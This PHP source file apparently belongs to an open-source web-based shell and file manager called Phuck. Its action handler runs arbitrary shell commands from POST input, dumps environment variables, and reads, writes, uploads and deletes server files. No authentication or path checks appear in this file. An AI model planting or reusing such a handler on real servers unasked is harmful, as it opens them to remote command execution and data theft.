<?php

/*
 * This file is part of Phuck package.
 *
 * (c) Vaibhav Pandey <contact@vaibhavpandey.com>
 *
 * This source file is subject to the MIT license that is bundled
 * with this source code in the file LICENSE.md.
 */

/**
 * @param array $keys
 * @param array $array
 * @return bool
 */
function phuck_assert_required(array $keys, array $array)
{
    $missing = array();
    foreach ($keys as $key) {
        if (empty($array[$key])) {
            $missing[] = $key;
        }
    }

    if (count($missing)) {
        phuck_respond_with_json(compact('missing'), 422);
        return true;
    }

    return false;
}

/**
 * @return bool
 */
function phuck_handle_action()
{
    $action = empty($_GET['action']) ? null : trim($_GET['action']);
    switch ($action) {
        case 'command':
            if (phuck_assert_required(array('cmd', 'cwd'), $_POST)) {
                return true;
            }

            $result = PhuckShell::exec($_POST['cwd'], $_POST['cmd']);
            $result['cwd'] = getcwd();
            phuck_respond_with_json($result);
            return true;
        case 'compress':
            if (phuck_assert_required(array('cwd', 'name', 'path'), $_POST)) {
                return true;
            }

            $paths = (array) $_POST['path'];
            $destination = $_POST['cwd'].DIRECTORY_SEPARATOR.$_POST['name'];
            $ok = PhuckFs::compress($paths, $destination, $_POST['cwd']);
            phuck_respond_with_json(compact('ok'));
            return true;
        case 'decompress':
            if (phuck_assert_required(array('cwd', 'path'), $_POST)) {
                return true;
            }

            $paths = (array) $_POST['path'];
            $ok = PhuckFs::decompress($paths[0], $_POST['cwd']);
            phuck_respond_with_json(compact('ok'));
            return true;
        case 'delete':
            if (phuck_assert_required(array('path'), $_POST)) {
                return true;
            }

            $paths = (array) $_POST['path'];
            foreach ($paths as $path) {
                $success = PhuckFs::rimraf($path);
                if (!$success) {
                    phuck_respond_with_nok();
                    return true;
                }
            }

            phuck_respond_with_ok();
            return true;
        case 'download':
            if (phuck_assert_required(array('cwd', 'path'), $_POST)) {
                return true;
            }

            $paths = (array) $_POST['path'];
            if (count($paths) === 1 && !is_dir($path = realpath($paths[0]))) {
                PhuckFs::download($path);
            } else {
                $temp = sys_get_temp_dir().DIRECTORY_SEPARATOR.uniqid('download');
                $ok = PhuckFs::compress($paths, $temp, $_POST['cwd']);
                if ($ok) {
                    PhuckFs::download($temp, 'Files-'.date('Ymd_His').'.zip');
                    PhuckFs::rimraf($temp);
                }
            }

            return true;
        case 'env':
            phuck_respond_with_json(PhuckShell::env());
            return true;
        case 'files':
            if (phuck_assert_required(array('cwd'), $_POST)) {
                return true;
            }

            if (is_dir($path = $_POST['cwd'])) {
                phuck_respond_with_json(PhuckFs::files($path));
            } else {
                phuck_respond_with_nok();
            }

            return true;
        case 'new':
            if (phuck_assert_required(array('cwd', 'name', 'type'), $_POST)) {
                return true;
            }

            $dest = $_POST['cwd'].DIRECTORY_SEPARATOR.$_POST['name'];
            $type = $_POST['type'];
            $ok = ($type === 'file') ? touch($dest) : mkdir($dest);
            phuck_respond_with_json(compact('ok'));
            return true;
        case 'paste':
            if (phuck_assert_required(array('cwd', 'path'), $_POST)) {
                return true;
            }

            $dest = $_POST['cwd'];
            $paths = (array) $_POST['path'];
            foreach ($paths as $path) {
                $success = PhuckFs::copy($path, $dest);
                if (!$success) {
                    phuck_respond_with_nok();
                    return true;
                }
            }

            if ($_POST['mode'] === 'cut') {
                array_walk($paths, 'PhuckFs::rimraf');
            }

            phuck_respond_with_ok();
            return true;
        case 'read':
            if (phuck_assert_required(array('path'), $_POST)) {
                return true;
            }

            $paths = (array) $_POST['path'];
            phuck_respond_with_json(array('contents' => PhuckFs::read($paths[0])));
            return true;
        case 'upload':
            if (phuck_assert_required(array('attachment'), $_FILES) || phuck_assert_required(array('cwd'), $_POST)) {
                return true;
            }

            $ok = PhuckFs::upload($_FILES['attachment'], $_POST['cwd']);
            phuck_respond_with_json(compact('ok'));
            return true;
        case 'write':
            if (phuck_assert_required(array('path', 'contents'), $_POST)) {
                return true;
            }

            $paths = (array) $_POST['path'];
            phuck_respond_with_json(array('contents' => PhuckFs::write($paths[0], $_POST['contents'])));
            return true;
        default:
            return false;
    }
}

/**
 * @param array|object|mixed $data
 * @param int $code
 * @return void
 */
function phuck_respond_with_json($data = null, $code = 200)
{
    http_response_code($code);
    if (empty($data)) {
        return;
    }

    header('Content-Type: application/json');
    $options = 0;
    if (version_compare(PHP_VERSION, '5.4.0') >= 0) {
        /** @noinspection PhpElementIsNotAvailableInCurrentPhpVersionInspection */
        $options = JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES;
    }

    echo json_encode($data, $options);
}

function phuck_respond_with_nok()
{
    phuck_respond_with_json(array('ok' => false));
}

function phuck_respond_with_ok()
{
    phuck_respond_with_json(array('ok' => true));
}
